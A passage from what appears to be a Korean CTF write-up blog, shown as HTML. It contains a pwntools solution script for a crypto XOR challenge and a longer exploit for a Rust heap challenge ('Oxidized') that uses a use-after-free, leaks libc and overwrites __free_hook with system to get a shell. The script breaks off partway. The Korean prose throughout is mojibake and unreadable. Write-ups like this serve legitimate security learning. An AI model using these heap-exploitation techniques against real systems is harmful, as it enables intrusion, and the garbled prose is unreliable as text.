</pre></table></code></div></div><p>ì™„ì „í•œ ëœë¤ ê°’ì„ ì´ìš©í•´ì„œ xorì„ í•˜ëŠ” ê²ƒ ê°™ì§€ë§Œ ì˜ ë³´ë©´ <code class="language-plaintext highlighter-rouge">&amp; 0xFF</code>ê°€ ì•„ë‹Œ <code class="language-plaintext highlighter-rouge">% 0xFF</code>ë¥¼ í†µí•´ì„œ í‚¤ë¥¼ byteí¬ê¸°ë¡œ ë§ì¶˜ë‹¤.<br /> ë•Œë¬¸ì— xorí•˜ëŠ” keyì˜ ê°’ì´ ì ˆëŒ€ë¡œ 255ê°€ ë  ìˆ˜ ì—†ê³  ë”°ë¼ì„œ ë¬´í•œìœ¼ë¡œ ìš”ì²­ì„ ë‚ ë¦¬ë©´ì„œ <code class="language-plaintext highlighter-rouge">(ëëë‚´ ë‚˜ì˜¤ì§€ ì•ŠëŠ” í•˜ë‚˜ì˜ ê°’) ^ 255</code>ë¥¼ í•˜ë©´ í”Œë˜ê·¸ì˜ ê° ë°”ì´íŠ¸ë¥¼ êµ¬í•  ìˆ˜ ìˆë‹¤.</p><p>ê·¸ë¦¬ê³  ë§ˆì¹¨ ì´ë²ˆ í•´í‚¹ìº í”„ì— ëƒˆë˜ ë¬¸ì œì™€ ì»¨ì…‰ì´ ê²¹ì³ì„œ poc ì½”ë“œë¥¼ ì¡°ê¸ˆ ìˆ˜ì •í•´ì„œ í’€ì´í•˜ì˜€ë‹¤.</p><blockquote><p>Solution Script</p></blockquote><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># p = process(['python','-u','./chall.py'])
</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"wargame.goatskin.kr"</span><span class="p">,</span> <span class="mi">42917</span><span class="p">)</span>
<span class="c1"># context.log_level= 0
</span>
<span class="n">key_set</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">255</span><span class="p">)))</span>
<span class="n">rand_set</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">)))</span>
<span class="n">my_key</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">rand_set</span> <span class="o">-</span> <span class="n">key_set</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span><span class="s">'3'</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span><span class="s">'255'</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">': '</span><span class="p">)</span> 
<span class="n">flag_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">())</span><span class="o">//</span><span class="mi">2</span>

<span class="n">flag_set</span> <span class="o">=</span> <span class="p">[</span><span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">flag_len</span><span class="p">)]</span>
<span class="n">flag</span> <span class="o">=</span> <span class="p">[</span><span class="s">' '</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">flag_len</span><span class="p">)]</span>

<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="nb">sum</span><span class="p">([</span><span class="nb">len</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">flag_set</span><span class="p">])</span> <span class="o">&gt;</span> <span class="n">flag_len</span><span class="p">:</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span><span class="s">'3'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span><span class="s">'255'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">': '</span><span class="p">)</span>
    <span class="n">enc</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
    
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">flag_len</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">flag_set</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">count</span><span class="p">(</span><span class="n">enc</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
            <span class="n">flag_set</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">pop</span><span class="p">(</span><span class="n">flag_set</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">index</span><span class="p">(</span><span class="n">enc</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag_set</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
            <span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">flag_set</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">^</span> <span class="n">my_key</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="s">' '</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">flag_set</span><span class="p">]))</span>
    <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>

<span class="k">print</span><span class="p">(</span><span class="n">count</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
</pre></table></code></div></div><h2 id="b-oxidized---pwnable">B. Oxidized - Pwnable<a href="#b-oxidized---pwnable" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Rust í¬ë„ˆë¸” ë¬¸ì œì´ë‹¤.<br /> ì •í™•í•˜ì§€ ì•Šì€ ì •ë³´ì´ì§€ë§Œ, ì˜ˆì „ì— ì–¼í• ë“£ê¸°ë¡œëŠ” ëŸ¬ìŠ¤íŠ¸ê°€ BOF ê°™ì€ low level ì·¨ì•½ì ìœ¼ë¡œë¶€í„° Cì–¸ì–´ë³´ë‹¤ ì•ˆì „í•˜ë„ë¡ ë§Œë“¤ì–´ì¡Œë‹¤ê³  ë“¤ì–´ì„œ ì‹ ê¸°í•œ ì»¨ì…‰ì´ë¼ê³  ëŠê»´ì¡Œë‹¤.</p><p>ë¬¸ì œì˜ ê°€ì¥ í° ì·¨ì•½ì ì€ UAFì˜€ë‹¤.</p><p>íŠ¹ì • í¬ê¸°ì˜ tcacheë¥¼ ê½‰ ì±„ìš°ê³  tcacheì— ë“¤ì–´ê°€ì§€ ì•ŠëŠ” í° í¬ê¸°ì˜ ê³µê°„ì„ í• ë‹¹í•˜ì—¬ UAFë¥¼ í†µí•´ libcì˜ ì£¼ì†Œë¥¼ ì–»ì—ˆë‹¤.</p><p>ë˜, freeëœnodeì— ì ë‹¹íˆ ì•„ë‹¤ë¦¬ë¥¼ ë§ì¶”ë©´ì„œ updateë¥¼ í•  ë•Œ<br /> ì‚¬ì´ì¦ˆë¥¼ 0ìœ¼ë¡œ ì£¼ê²Œ ë˜ë©´ ë˜ ë‹¤ë¥¸ freeëœ ê³µê°„ì˜ nodeì— writeë¥¼ í•  ìˆ˜ ìˆëŠ” ë²„ê·¸ê°€ ì¡´ì¬í•˜ì˜€ë‹¤.</p><p>ì´ë¥¼ ì´ìš©í•´ì„œ íŠ¹ì • ë…¸ë“œë¥¼ ì•„ë‹¤ë¦¬ê°€ ë§ê²Œ ì´ë¦„ì„ ì ë‹¹íˆ ì„¤ì •í•˜ê³ <br /> í•´ë‹¹ ë…¸ë“œì˜ í¬ì¸í„°ë¥¼ <code class="language-plaintext highlighter-rouge">__free_hook</code>ìœ¼ë¡œ ë³€í™˜í•œ ë’¤ì— <code class="language-plaintext highlighter-rouge">is_string</code>ì„ falseê°’ìœ¼ë¡œ ì½ì–´ì§€ë„ë¡ ë…¸ë“œë¥¼ ìˆ˜ì •í•˜ì˜€ë‹¤.</p><p>ì´ë•Œ, ìœ„ ê³¼ì •ì„ ì •í™•í•˜ê²Œ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ì„œ ëª‡ ì‹œê°„ì˜ ë™ì ë””ë²„ê¹… ëì— ì˜¤í”„ì…‹ì„ ëª¨ë‘ ë½‘ì•˜ë‹¤ ã… </p><p>ë˜, updateí•˜ëŠ” ê³¼ì •ì—ì„œ <code class="language-plaintext highlighter-rouge">__free_hook</code> ì£¼ì†Œë¥¼ ì…ë ¥í•  ë•Œ <code class="language-plaintext highlighter-rouge">read_str</code>ë¥¼ í˜¸ì¶œí•˜ê²Œ ë˜ëŠ”ë°<br /> ì´ë•Œ í•´ë‹¹ í•¨ìˆ˜ì—ì„œ UTF-8ì— validí•˜ì§€ ì•Šì€ ì¸í’‹ì´ ë“¤ì–´ì˜¤ë©´ í”„ë¡œì„¸ìŠ¤ê°€ ì£½ì–´ë²„ë¦¬ëŠ” í˜„ìƒì´ ìˆì—ˆë‹¤.<br /> ì´ ë•Œë¬¸ì— <code class="language-plaintext highlighter-rouge">__free_hook</code> ì£¼ì†Œì˜ ëª¨ë“  ë°”ì´íŠ¸ê°€ 0x80ë³´ë‹¤ ì‘ì€ì§€ ê²€ì‚¬í•˜ê³  ì•„ë‹ˆë©´ ë‹¤ì‹œ ì—°ê²°í•˜ëŠ” ì¡°ê±´ì„ ì¶”ê°€í–ˆë‹¤.<br /> ë‹¨ìˆœ ê³„ì‚°ìœ¼ë¡œ ì•½ 1/16 ì •ë„ì˜ í™•ë¥ ì´ë¯€ë¡œ ì¡°ê±´ì„ ë§ì¶”ê¸°ëŠ” ì–´ë µì§€ ì•Šì•˜ìœ¼ë‚˜<br /> ë¦¬ëª¨íŠ¸ í™˜ê²½ì—ì„œ í•œ ë²ˆ í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹¤í–‰í•˜ë©´ ë‹¤ì‹œ ì—°ê²°í•  ìˆ˜ ì—†ì–´ì„œ ì ‘ì† í•œ ë²ˆ í•  ë•Œë§ˆë‹¤ vmì„ ë‹¤ì‹œ ìš”ì²­í•´ì•¼í–ˆë‹¤â€¦</p><p>+ ëŒ€íšŒê°€ ëë‚œ í›„ì— ì¶œì œì writeupì„ ë´¤ì„ ë• UTF-8 ë¬¸ì œê°€ ì—†ì–´ë³´ì—¬ì„œ ë‚˜ì¤‘ì— í•œ ë²ˆ ì´ìœ ë¥¼ ì•Œì•„ë³´ê¸°ë¡œ í–ˆë‹¤.</p><p>ì´í›„, ë®ì–´ ì”Œì›Œì§„ ë…¸ë“œë¥¼ updateí•´ì„œ <code class="language-plaintext highlighter-rouge">__free_hook</code>ì˜ ê°’ì„ <code class="language-plaintext highlighter-rouge">system</code> ì£¼ì†Œë¡œ ìˆ˜ì •í–ˆê³ <br /> <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code>ì„ í•˜ë‚˜ ë§Œë“¤ê³  ì‚­ì œí•´ì„œ ì‰˜ì„ íœ™ë“í•˜ì˜€ë‹¤.</p><p><br /> ì•„ë‹¤ë¦¬ë§Œ ë§ìœ¼ë©´ ê·¸ëŒ€ë¡œ ëŒë¦¬ê³  ê°€ì ¸ê°€ì„œ ì½”ë“œê°€ ì¢€ ì§€ì €ë¶„í•˜ë‹¤</p><blockquote><p>Exploit Script</p></blockquote><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">http</span> <span class="kn">import</span> <span class="n">cookies</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="n">REMOTE</span><span class="o">=</span><span class="mi">1</span>
<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./chal_patched'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc-2.27.so'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">insert</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="n">value</span><span class="p">,</span><span class="n">size</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">LOGGING</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">size</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"insert(</span><span class="si">{</span><span class="n">key</span><span class="o">=</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">value</span><span class="o">=</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">size</span><span class="o">=</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"insert(</span><span class="si">{</span><span class="n">key</span><span class="o">=</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">value</span><span class="o">=</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'key &gt;&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">key</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">):</span>
        <span class="k">assert</span> <span class="n">size</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'is it String? (Y/N) &gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'Y'</span><span class="p">)</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'size &gt;&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'is it String? (Y/N) &gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'N'</span><span class="p">)</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">search</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">LOGGING</span><span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"search(</span><span class="si">{</span><span class="n">key</span><span class="o">=</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'key &gt;&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">key</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
    
<span class="k">def</span> <span class="nf">update</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">LOGGING</span><span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"update(</span><span class="si">{</span><span class="n">key</span><span class="o">=</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">value</span><span class="o">=</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">size</span><span class="o">=</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'3'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'key &gt;&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">key</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">):</span>
        <span class="k">assert</span> <span class="n">size</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'size &gt;&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">LOGGING</span><span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"delete(</span><span class="si">{</span><span class="n">key</span><span class="o">=</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'4'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'key &gt;&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">key</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">viewall</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">LOGGING</span><span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"viewall()"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'5'</span><span class="p">)</span>

<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">LOGGING</span><span class="o">=</span> <span class="bp">False</span>
        <span class="k">if</span> <span class="n">REMOTE</span><span class="p">:</span>
            <span class="n">pause</span><span class="p">()</span>
            <span class="n">x</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"https://dreamhack.io/api/v1/ctf/ctfs/24/challenges/177/vms/"</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="s">"""ë‚´ ì¿ í‚¤"""</span><span class="p">).</span><span class="n">json</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span> <span class="c1"># ë¹ ë¥´ê²Œ ì£¼ì†Œë¥¼ ê°€ì ¸ì˜¤ê¸° ìœ„í•œ ì½”ë“œ ã…ã…;;
</span>
            <span class="n">host</span> <span class="o">=</span> <span class="n">x</span><span class="p">[</span><span class="s">'host'</span><span class="p">]</span>
            <span class="n">port</span> <span class="o">=</span> <span class="n">x</span><span class="p">[</span><span class="s">'port_mappings'</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>

            <span class="k">print</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
            <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
            <span class="n">LOGGING</span> <span class="o">=</span> <span class="bp">True</span>

        <span class="c1"># if REMOTE:p = remote('192.168.2.1',13100)
</span>        <span class="k">else</span><span class="p">:</span><span class="n">p</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="n">aslr</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
            <span class="n">insert</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">).</span><span class="n">encode</span><span class="p">(),</span><span class="mh">0x60</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
            <span class="n">delete</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">)</span>

        <span class="n">insert</span><span class="p">(</span><span class="mh">0x70</span><span class="p">,</span> <span class="sa">b</span><span class="s">'DEADBEEF'</span><span class="p">,</span><span class="mh">0x420</span><span class="p">)</span>
        <span class="n">insert</span><span class="p">(</span><span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0xcafebabe</span><span class="p">)</span>

        <span class="n">viewall</span><span class="p">()</span>
        <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'1. Insert item'</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">).</span><span class="n">splitlines</span><span class="p">()[</span><span class="mi">6</span><span class="p">].</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">])</span> <span class="o">-</span> <span class="mh">0x3ebcb0</span>
        <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">'LIBC: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

        <span class="n">viewall</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">REMOTE</span><span class="p">:</span><span class="n">heap</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'1. Insert item'</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">).</span><span class="n">splitlines</span><span class="p">()[</span><span class="mi">2</span><span class="p">].</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">])</span> <span class="o">-</span> <span class="mi">21088</span>
        <span class="k">else</span><span class="p">:</span><span class="n">heap</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'1. Insert item'</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">).</span><span class="n">splitlines</span><span class="p">()[</span><span class="mi">2</span><span class="p">].</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">])</span> <span class="o">-</span> <span class="mi">21344</span>
        <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">'HEAP: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

        <span class="n">target</span> <span class="o">=</span> <span class="mh">0x5468</span> <span class="o">+</span> <span class="n">heap</span>
        <span class="k">if</span> <span class="n">REMOTE</span><span class="p">:</span><span class="n">target</span><span class="o">-=</span><span class="mh">0x100</span>
        <span class="k">print</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>

        <span class="n">viewall</span><span class="p">()</span>
        <span class="n">victim</span> <span class="o">=</span> <span class="mh">0x70</span>
        <span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">victim</span><span class="p">))</span>

        <span class="k">print</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>

        <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">i</span><span class="o">&gt;=</span><span class="mh">0x80</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="p">)):</span>
            <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span><span class="sa">b</span><span class="s">'6'</span><span class="p">)</span>
            <span class="k">assert</span> <span class="mi">0</span>
            
        <span class="n">pause</span><span class="p">()</span>
        <span class="n">LOGGING</span> <span class="o">=</span> <span class="bp">True</span>
        <span class="n">update</span><span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x60</span><span class="s">'</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>

        <span class="n">writer</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="sa">b</span><span class="s">'60'</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
        <span class="n">update</span><span class="p">(</span><span class="n">writer</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">])</span>
